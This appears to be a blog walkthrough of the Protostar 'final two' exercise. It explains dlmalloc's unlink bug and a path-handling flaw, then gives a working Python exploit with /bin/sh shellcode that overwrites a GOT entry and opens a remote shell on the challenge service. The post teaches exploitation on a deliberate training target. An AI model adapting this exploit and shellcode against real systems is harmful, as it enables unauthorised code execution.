---
title: Binary Exploitation - Protostar - Heap
date: 2020-01-06 23:23:23
tags: Security
---

# Introduction
This post will look into solving [final two](https://exploit.education/protostar/final-two/). An exercise that uses a bug in [Doug Lea Malloc](http://gee.cs.oswego.edu/dl/html/malloc.html) to allow abitrary code execution. More information about the bug can be found [here](https://www.win.tue.nl/~aeb/linux/hh/hh-11.html#ss11.3). 

# Vulnerability
To understand the vulnerability, you should know that the way that `malloc` works is that it keeps track of the "chunks" on the heap that are currently being used (caused by a call to `malloc`) and it also keeps track of the free space in a doubly linked list. This vulnerability comes from when a block is `free`'d. `

When `free` is called on a memory chunk, the `malloc`, the implementation will attempt consolidate the free chunks by combining the chunk being `free`'d with surrounding free chunks (that is either next or previous chunks).

Before we start looking at the code, it's probably worth mentioning that I'm using [this](https://github.com/ennorehling/dlmalloc/blob/master/malloc.c)  version of the `dlmalloc` that I found on Github as a reference.

Let's first take a look at the chunk data structure.

```cpp
struct malloc_chunk {
INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */
INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */
struct malloc_chunk* fd; /* double links -- used only if free. */
struct malloc_chunk* bk;
};
```

We can see that a chunk will hold the size of the current chunk and the size of the previous chunk. If the chunk is not being used, then it will also hold pointers to the forward and backward chunks.

Now let's look at the free function on line #3714.

```cpp
/* free(0) has no effect */
if (mem != 0) {
// malloc...
}
```
This is pretty self explanatory.

```cpp
p = mem2chunk(mem);
size = chunksize(p);
check_inuse_chunk(p);
```
Let's how `mem2chunk` is defined:
```cpp
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
```
This takes the memory that is passed in by the user and returns the address of the chunk including the metadata.

Now let's see how `chunksize` is defined:
```cpp
#define  IS_MMAPPED  0x2
#define  PREV_INUSE 0x1
#define  SIZE_BITS (PREV_INUSE|IS_MMAPPED)
#define  chunksize(p) ((p)->size & ~(SIZE_BITS))
```
So, essentially the `chunksize` is just the `size` member of the struct with the last two bits zeroed out. Additionally, we can see that the second to last it is used for `IS_MMAPPED` and the last bit is used for `PREV_INUSE`.

The last line `check_inuse_chunk` will trigger an error if the chunk is not in use.

The next block is for handling for fast bins, which are small memory chunks that are handled differently (and doesn't really concern us).

```cpp
if ((CHUNK_SIZE_T)(size) <= (CHUNK_SIZE_T)(av->max_fast) {
// handle fastbin...
}
```

Now, we check if we need to attempt to consolidate the previous/next blocks, depending on whether the current chunk is `mmapped`.

```cpp
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)

else  if (!chunk_is_mmapped(p)) {
// handle consolidation...
}
```

Essentially, if the chunk is not `mmapped` then we want to consolidate the chunk. The bug is in the consolidation code, so this is important.

Let's see what we do at the start of the consolidation:
```cpp
set_anychunks(av);
nextchunk = chunk_at_offset(p, size);
nextsize = chunksize(nextchunk);
```
```cpp
#define  chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s)))
```
`set_anychunks` just let's the `malloc` state know that there are some free chunks.

The rest is pretty self explanatory, we just get the next chunk and also the size of that chunk.

We first check if we should consolidate backwards, this may be useful occasionally, but not nearly as often as forward consolidation (which comes next).  This is due to the fact usually with heap overflows we can control the metadata for the "next" chunk, so it is easier to use. 

```cpp
if (!prev_inuse(p)) { 
	// consolidate backwards...
}
```

Without further ado, let's a look at the forward consolidation.

```cpp
#define inuse_bit_at_offset(p, s) (((mchunkptr)(((char*)(p)) + (s)))->size & PREV_INUSE)

if (nextchunk != av->top) {
	/* get and clear inuse bit */
	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
	set_head(nextchunk, nextsize);
		/* consolidate forward */
		if (!nextinuse) {
		unlink(nextchunk, bck, fwd);
		size += nextsize;
		}

	// connect chunk with the rest of the linked list of unsorted chunks...
}
// basically finished with free()
```

Essentially, we check that the "next chunk" is not in use, and if this is true when we go ahead and `unlink`.  Now let's a take a look at `unlink`:

```cpp
#define unlink(P, BK, FD) { \
FD = P->fd; \
BK = P->bk; \
FD->bk = BK; \
BK->fd = FD; \
}
```
You can see that what unlink does, is basically "combines" a chunk with the one "previous chunk". It does this by writing to the backward chunk, saying that it's new forward chunk, instead of the current chunk, is now the forward chunk of the current chunk. Also, it writes to the forward chunk, that the new backward chunk has changed from the current chunk to the current chunk's backward chunk.

There exists a vulnerability here, in that if there exists a way for us to control the heap metadata (via a buffer overflow), then we can control the forward and backward pointers of a chunk that will be `free`'d and thus choose locations we would like `unlink` to write to.

It should be noted that with any write we attempt to do, another value will be written back.

So, to reiterate the chunk being `free`'d needs to have the following (for forward consolidation):
* To be larger than the default `fastbin` size (80 bytes).
* To have the `IS_MMAPPED` bit not set.
* To have `PREV_INUSE` bit set.
* To have a `next_chunk` that has a `next_chunk` that has `PREV_INUSE` bit set.
* Set up the `next_chunk` with forward and backward pointers that we want to write to (with the offsets in mind).

This should allow us to have an arbitrary write (which will go into the GOT) and allow us to redirect code execution to somewhere we can control (the heap) to execute shell code.

# Challenge
Let's take a look at the source code for the challenge:
```c
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993
#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;
  /*
  * Work out old software bug
  */
  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;
  dll = 0;
  while(1) {
      if(dll >= 255) break;
      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;
      if(strncmp(buf, "FSRD", 4) != 0) break;
      check_path(buf + 4);     
      destroylist[dll] = buf;
      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;
  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);
  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);
  get_requests(fd);

}
```

Should be noted, that I've modified the code from the exploit exercises websites, since I believe there were some mistakes with it.

There's a while loop that continuously reads characters from the connection and will eventually free the characters that are stored. 

```cpp
  while(1) {
      if(dll >= 255) break;
      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;
      if(strncmp(buf, "FSRD", 4) != 0) break;
      check_path(buf + 4);     
      destroylist[dll] = buf;
      dll++;
  }
```

It should be noted that the amount of characters that are read must be `REQSZ`, which is 128.
Additionally, the first four characters must be `FSRD`. 
When we want to stop the connection, we can simply just send a message that doesn't fulfill these categories.  Stopping the connection will also cause all the strings in the `destroylist`  to be `free`'d (which is where the exploit is).

Let's take a look at the `check_path` function:
```cpp
void check_path(char *buf)
{
  char *start;
  char *p;
  int l;
  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
      }
  }
}
```
We first find the last occurrence of `'/'` and store it in `p`.

```cpp
  p = rindex(buf, '/');
```

Then, we get the length of characters in the buffer after `'/'`.
```cpp
   l = strlen(p);
```

If the call to `rindex` was successful then we will find the first occurrence of the substring `ROOT`  and store it in `start`.

If we're able to find `ROOT`, we will attempt to find the previous occurrence of `'/'` .

We do this by just going backwards from from `ROOT` and find the previous `'/'`.

We then copy everything from after the last `'/'` stored in `p` to the previous `'/'` before `ROOT`.

```cpp
if(p)  {
	  start =  strstr(buf,  "ROOT")
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
      }
} // function ends
```

To better illustrate this:
  ```
  /ROOT_FILLER_/HELLO
  ```
turns into this:
```
 /HELLOILLER_/HELLO
 ```
 The exploit is that to find the  `'/'` before `ROOT`, instead of using `index`, we decrement  `start` , this could actually be before the buffer starts, and therefore could be part of the previous buffer. In between the previous buffer and the current buffer should be heap metadata that we can overwrite using the memory.
 
We could set up the heap like the following:
* First we place a `'/'`  at the end of the first buffer, the `...` should be some text that pads the total message size to 128.
`FSRD.../`
* Next, we can set up the second buffer such that `ROOT` appears before any `'/'`s. Then we have a `'/'` after the `ROOT`, which is directly followed by the bytes that we wish to overwrite the heap metadata with.
`FSRDROOT/NEW_HEAP_METADATA...`
* This means that before `check_path` is called on the the heap will look like this:
`FSRD.../ HEAP_METADATA FSRDROOT/NEW_HEAP_METADATA`
* The `check_path` call, the `NEW_HEAP_METADATA` will overwrite the `HEAP_METADATA`.

Let's try get a simple script set up that will overwrite the heap metadata:
```python
import struct
import socket

def pad_input(s, b):
       return s + (128 - (len(s) + len(b))) * "\x90" + b

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2993))

first = pad_input("FSRD",  "/")
second = pad_input("FSRDROOT", "/" + struct.pack("I", 0x12345678) * 4 )

s.send(first)
s.send(second)

```
We can set a breakpoint at the end of `check_path`, after the second call to `check_path`, we can inspect the heap.
```
Breakpoint 1, 0x0804bd46 in check_path (buf=0x4 <Address 0x4 out of bounds>) at final2/final2.c:30
30	in final2/final2.c
(gdb) x/50x 0x804e000
0x804e000:	0x00000000	0x00000089	0x44525346	0x90909090
0x804e010:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e020:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e030:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e040:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e050:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e060:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e070:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e080:	0x90909090	0x2f909090	0x12345678	0x12345678
0x804e090:	0x12345678	0x12345678	0x90909090	0x90909090
0x804e0a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e0c0:	0x90909090	0x90909090
```

You can see that we've successfully overwritten the heap metadata with our `0x12345678`'s.
For reference, this is what the heap (with it's metadata) looks like if we include an extra  `'/'` before `ROOT` in the second message.

```
0x804e000:	0x00000000	0x00000089	0x44525346	0x90909090
0x804e010:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e020:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e030:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e040:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e050:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e060:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e070:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e080:	0x90909090	0x2f909090	0x00000000	0x00000089
0x804e090:	0x44525346	0x3456782f	0x34567812	0x34567812
0x804e0a0:	0x34567812	0x90909012	0x90909090	0x90909090
0x804e0b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x804e0c0:	0x90909090	0x90909090
```
Now we can try modify the script to redirect code execution to somewhere that we can control the (the first buffer). Let's pick `0x804e010` which is an address inside the first buffer.

Now let's find the address of an entry in the GOT that we want to overwrite. We're going to use `write`, which has a GOT entry at `0x804d41c`.

When we actually send this address, we'll need to minus 12 off it, since `unlink` writes to the `bk` field of the chunk and we're passing in the base address of the chunk.

We need to set the heap such that it allows us to exploit the bug in `dlmalloc`. We'll be exploiting the `free` of the first buffer. This means that we need modify the chunk for the second buffer such that it has `PREV_INUSE` bit not set and also the `PREV_INUSE` bit for the next chunk not set. 

There is a small complication that most values for the size member of the chunk struct will require `\x00` to express e.g. if we wanted a size of 100, we'd need to write `\x64\x00\x00\x00`, to the size member. However we cannot use `\x00` since the `read` method will interpret it as the end of the string. Therefore, we use a negative number instead e.g. `\xff\xff\xff\xfc` or -4, this means that it will look for this means we need to place any even number behind the `size` member and it should successfully pass the test. We'll use -4 again, since it makes for cleaner code.

It's also important that we pad the end of `first` message, because of:
```cpp
3803: set_head(p, size | PREV_INUSE);
3804: set_foot(p, size);
```
in the `dlmalloc` implementation, the `set_head` will update the first chunk's size, and the `set_foot` will write to the `next_chunk`'s `prev_size`. However, because the size has been corrupted it'll actually undershoot the "actual" location of the field and write into the end of the first buffer. 

Therefore we pad the end of the `shellcode` with some `'0x90'`s, but any characters is fine. 

We will also add `\xeb\x14` which is a `jmp 0x16` instruct that will skip the address that is written back into the heap. 

```python
import struct
import socket
import telnetlib

def pad_input(s, b):
       return s + (128 - (len(s) + len(b))) * "\x90" + b

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2993))

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


first = pad_input("FSRD" + "\x90" * 8 + "\xeb\x14", shellcode + "\x90" * 16 +  "/")
second = pad_input("FSRDROOT", "/" +  "\xfc\xff\xff\xff" * 2 + struct.pack("I", 0x804d410) + struct.pack("I", 0x804e010))
third = "exit"

s.send(first)
s.send(second)
s.send(third)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

In the end, we can also use a variety of different values for the injected offsets e.g.
```python
second = pad_input("FSRDROOT", "/" +  "AAAA" + "\xf6\xff\xff\xff" + struct.pack("I", 0x804d410) + struct.pack("I", 0x804e014))
```
will also work,  since even if we look back past our injected code, it's pretty likely we end up hitting one of our `\x90\x90\x90\x90` blocks that also does not have the `PREV_INUSE` bit set. This is also valid, however you'll probably have to increase the padding of the shellcode, since the `set_foot` call will cause the size be written closer to the start of the first buffer.